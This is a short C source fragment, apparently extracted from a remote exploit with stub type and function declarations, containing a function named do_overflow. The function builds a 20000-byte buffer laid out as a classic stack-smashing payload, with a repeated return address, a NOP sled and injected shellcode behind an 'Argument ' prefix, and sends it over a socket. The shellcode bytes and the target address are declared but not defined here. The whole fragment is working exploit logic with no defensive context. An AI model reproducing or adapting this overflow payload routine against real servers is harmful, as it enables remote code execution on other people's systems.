
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int NOP ;
 unsigned int htonl (int ) ;
 int memcpy (char*,char*,int ) ;
 int memset (char*,int,int) ;
 int retaddr ;
 char* shellcode ;
 int strlen (char*) ;
 int zflush (int) ;
 int zwrite (char*,int,int) ;

int do_overflow(int sockfd)
{
char buffer[20000];
int i = 0;

memset(buffer, 0x0, 20000);
memset(buffer, 0x42, 19782);

for(i = 0 ; i < 19780-8; i+=4)
   *(unsigned int *)&buffer[i] = htonl(retaddr);

for(i = 0; i < 19600; i+=4)
           *(unsigned int *)&buffer[i] = htonl(NOP);

        memcpy(buffer+19000, shellcode, strlen(shellcode));

memcpy(buffer, "Argument ", strlen("Argument "));
buffer[19781] = '\012';

zwrite(buffer, 19782, sockfd);
zflush(sockfd);
}
